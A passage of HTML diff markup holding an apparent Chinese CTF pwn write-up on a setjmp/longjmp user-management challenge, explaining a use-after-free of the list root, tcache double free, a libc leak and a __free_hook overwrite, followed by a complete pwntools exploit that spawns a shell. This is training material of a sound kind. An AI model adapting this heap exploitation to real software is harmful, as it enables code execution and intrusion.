data-darkreader-inline-color="">19</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">20</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">21</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">22</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">23</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">24</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">25</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">26</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">27</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">28</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">29</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">30</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">31</li></ul></pre>
+      <p>
+        在这个例子中，<code>main</code>函数首先调用<code>_setjmp</code>来设置一个返回点。如果<code>my_function</code>检测到错误条件，它会调用<code>longjmp</code>，这将使控制流立即返回到<code>_setjmp</code>调用的位置，跳过<code>my_function</code>的后续代码。<code>main</code>函数中的<code>else</code>分支将在<code>longjmp</code>之后执行，处理错误情况。
+      </p>
+      <p>
+        需要注意的是，<code>longjmp</code>和<code>setjmp</code>的使用应当谨慎，因为它们可能会破坏程序的状态，例如，跳过资源释放代码或导致线程安全问题。通常，异常处理机制如C++的<code>try/catch</code>或更高级的错误处理方法是更可取的替代方案。
+      </p>
+      <h3><a name="t5"></a><a id="_71"></a>实例</h3>
+      <p>
+        当你在C程序中调用<code>longjmp()</code>函数时，它会将程序控制权立即转移到与传入<code>jmp_buf</code>关联的<code>setjmp()</code>调用点。在这个情况下，<code
+          >longjmp(main_begin_jmp_buf, 1);</code
+        >将导致程序的控制流跳回到<code>_setjmp(main_begin_jmp_buf);</code>所在的点。
+      </p>
+      <p>
+        具体来说，在你的代码片段中，<code>longjmp(main_begin_jmp_buf, 1);</code
+        >会使得程序执行从<code>longjmp</code>调用点跳转回<code>_setjmp(main_begin_jmp_buf);</code>这一行之后的第一条指令。也就是说，如果<code>_setjmp(main_begin_jmp_buf);</code>之后紧接着是：
+      </p>
+      <pre
+        data-index="3"
+        class="set-code-show prettyprint"
+      ><code class="prism language-c has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">_setjmp</span><span class="token punctuation">(</span>main_begin_jmp_buf<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+<span class="token punctuation">{<!-- --></span>
+  v3 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"restart at %ld\n"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<div class="hljs-button signin active" data-title="登录复制" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.4334&quot;}"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">1</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">2</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">3</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">4</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">5</li></ul></pre>
+      <p>
+        那么<code>longjmp(main_begin_jmp_buf, 1);</code>执行后，程序会从<code
+          >if ( _setjmp(main_begin_jmp_buf) )</code
+        >这一行开始继续执行，但这一次<code>_setjmp()</code>不再返回0，而是返回了<code>longjmp()</code>传递的值（在这种情况下是1）。因此，<code>if</code>语句的条件为真，程序将执行<code
+          >v3 = time(0LL);</code
+        >和<code>printf("restart at %ld\n", v3);</code>这两行代码。
+      </p>
+      <p>
+        简而言之，<code>longjmp(main_begin_jmp_buf, 1);</code
+        >会使程序跳转到<code>_setjmp(main_begin_jmp_buf);</code>之后的代码段，并从那里继续执行，且<code>_setjmp()</code>的返回值将为1，这将触发<code>if</code>语句中的代码块。
+      </p>
+      <h2><a name="t6"></a><a id="_87"></a>逆向</h2>
+      <p>
+        <img
+          src="https://i-blog.csdnimg.cn/direct/0161eef1ae7643c5bcfb2c393fc1732a.png"
+          alt="在这里插入图片描述"
+        /><br />
+        <img
+          src="https://i-blog.csdnimg.cn/direct/e722cbabb5b34d8c81faf8994970a15c.png"
+          alt="在这里插入图片描述"
+        /><br />
+        <img
+          src="https://i-blog.csdnimg.cn/direct/e2bac6567a6e45dbb42c7c1e6a901bf5.png"
+          alt="在这里插入图片描述"
+        /><br />
+        <img
+          src="https://i-blog.csdnimg.cn/direct/4626d1d4fc8b48b5a55a1256cb462364.png"
+          alt="在这里插入图片描述"
+        /><br />
+        <img
+          src="https://i-blog.csdnimg.cn/direct/f655c460a48a495d981d269f0d7ce7ac.png"
+          alt="在这里插入图片描述"
+        />
+      </p>
+      <h2><a name="t7"></a><a id="_93"></a>相关参考</h2>
+      <p>
+        <a
+          href="https://firmianay.gitbook.io/ctf-all-in-one/6_writeup/pwn/6.1.17_pwn_secconctf2016_jmper"
+          rel="nofollow"
+          >https://firmianay.gitbook.io/ctf-all-in-one/6_writeup/pwn/6.1.17_pwn_secconctf2016_jmper</a
+        ><br />
+        <a
+          href="https://darkwing.moe/2019/09/24/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B024-%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF/"
+          rel="nofollow"
+          >https://darkwing.moe/2019/09/24/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B024-%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF/</a
+        >
+      </p>
+      <h2><a name="t8"></a><a id="_97"></a>思路</h2>
+      <blockquote>
+        <p>非常感谢Eurus师傅提供的帮助</p>
+      </blockquote>
+      <p>
+        反编译有问题，这里new_user后，root_chunk会改变<br />
+        <img
+          src="https://i-blog.csdnimg.cn/direct/3a131ce0616542b3b4970d1f0fe72fa5.png"
+          alt="在这里插入图片描述"
+        /><br />
+        这里实现了循环双向链表，大致就是创建用户会在链表尾部插入，然后更新root_chunk，find会根据name来检索循环链表，最后直到下一个与开始的节点相同就停止
+      </p>
+      <blockquote>
+        <p>
+          漏洞点在于free掉当前root_chunk后不会改变root_chunk的值，find依然会按照原来的root_chunk来寻找，进而new，dele，change都会有影响
+        </p>
+      </blockquote>
+      <p>fastbin是个无底洞，塞不到unsortedbin中去。下面代码得证</p>
+      <pre
+        data-index="4"
+        class="set-code-show prettyprint"
+      ><code class="prism language-c has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">char</span><span class="token operator">*</span>a<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">26</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{<!-- --></span>
+        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">26</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{<!-- --></span>
+        <span class="token function">free</span><span class="token punctuation">(</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<div class="hljs-button signin active" data-title="登录复制" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.4334&quot;}"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">1</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">2</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">3</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">4</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">5</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">6</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">7</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">8</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">9</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">10</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">11</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">12</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">13</li></ul></pre>
+      <p>
+        由于泄露heap地址，所以free
+        root后虽然改变name，但依然可以修改passwd，正是tcache的字段用来判断double
+        free（先判断e-&gt;key ==
+        tcache，然后遍历idx对应的tcache，然后看看有没有地址相同），然后利用double
+        free造成任意堆地址分配，进而分配到某个堆的头部作为data部分然后passwd正好是size部分修改size，然后free掉从而进入unsortedbin，为了保证引起检查错误，所以要分配一堆0x30的chunk来满足chunk_extend
+      </p>
+      <p>然后再利用double free改free_hook就行</p>
+      <h2>
+        <a name="t9"></a><a id="double_freelibc_129"></a>double
+        free-&gt;泄露libc
+      </h2>
+      <p>分配到堆头部分，改堆头size，free后进入unsortedbin可泄露</p>
+      <h2><a name="t10"></a><a id="exp_132"></a>exp</h2>
+      <pre
+        data-index="5"
+        class="prettyprint set-code-show"
+      ><code class="prism language-python has-numbering" onclick="mdcp.signin(event)" style="position: unset;"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>
+context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
+
+
+<span class="token keyword">def</span> <span class="token function">restart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'&gt; '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>passwd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'&gt; '</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'username &gt; '</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'password &gt; '</span><span class="token punctuation">,</span>passwd<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'&gt; '</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'username &gt; '</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>passwd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'&gt; '</span><span class="token punctuation">,</span><span class="token string">b'4'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'username &gt; '</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'password &gt; '</span><span class="token punctuation">,</span>passwd<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'&gt; '</span><span class="token punctuation">,</span><span class="token string">b'5'</span><span class="token punctuation">)</span>
+
+p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./run"</span><span class="token punctuation">)</span>
+
+
+add<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">,</span><span class="token string">b"2"</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token string">b"root"</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">,</span><span class="token string">b"1"</span><span class="token punctuation">)</span> <span class="token comment"># cover part heap address</span>
+show<span class="token punctuation">(</span><span class="token punctuation">)</span> 
+heap<span class="token operator">=</span>u64<span class="token punctuation">(</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x531</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">,</span><span class="token string">b"2"</span><span class="token punctuation">)</span> 
+add<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">,</span><span class="token string">b"3"</span><span class="token punctuation">)</span> <span class="token comment"># then need heap address to find the chunk to edit</span>
+
+<span class="token comment"># 0x420</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span><span class="token string">b"extend"</span><span class="token punctuation">,</span><span class="token string">b"extend"</span><span class="token punctuation">)</span>
+
+
+delete<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">)</span>      <span class="token comment"># else can't find </span>
+
+restart<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># root_chunk change 3 </span>
+
+delete<span class="token punctuation">(</span><span class="token string">b"root"</span><span class="token punctuation">)</span>
+
+
+
+
+edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x540</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">b"0"</span><span class="token punctuation">)</span> 
+
+
+delete<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x540</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+
+add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x560</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x560</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">b"unuse"</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x421</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x570</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># new user will change 16 24 </span>
+
+
+restart<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># enconvinent to layout</span>
+add<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">,</span><span class="token string">b"1"</span><span class="token punctuation">)</span>
+
+show<span class="token punctuation">(</span><span class="token punctuation">)</span>
+leak<span class="token operator">=</span>u64<span class="token punctuation">(</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x1ecb31</span>
+
+delete<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token string">b"root"</span><span class="token punctuation">)</span>
+
+edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x740</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x740</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token operator">+</span><span class="token number">0x1eee48</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token string">b"nouse"</span><span class="token punctuation">,</span><span class="token string">b"nouse"</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token operator">+</span><span class="token number">0x52290</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+
+<div class="hljs-button signin active" data-title="登录复制" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.4334&quot;}"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">1</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">2</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">3</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">4</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">5</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">6</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">7</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">8</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">9</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">10</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">11</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">12</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">13</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">14</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">15</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">16</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">17</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">18</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">19</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">20</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">21</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">22</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">23</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">24</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">25</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">26</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">27</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">28</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">29</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">30</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">31</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">32</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">33</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">34</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">35</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">36</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">37</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">38</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">39</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">40</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">41</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">42</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">43</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">44</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">45</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">46</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">47</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">48</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">49</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">50</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">51</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">52</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">53</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">54</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">55</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">56</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">57</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">58</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">59</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">60</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">61</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">62</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">63</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">64</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">65</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">66</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">67</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">68</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">69</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">70</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">71</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">72</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">73</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">74</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">75</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">76</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">77</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">78</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">79</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">80</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">81</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">82</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">83</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">84</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">85</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">86</li><li style="color: rgb(153, 153, 153); --darkreader-inline-color: #a8a095;" data-darkreader-inline-color="">87</li><li style="color: rgb(153, 153, 153); 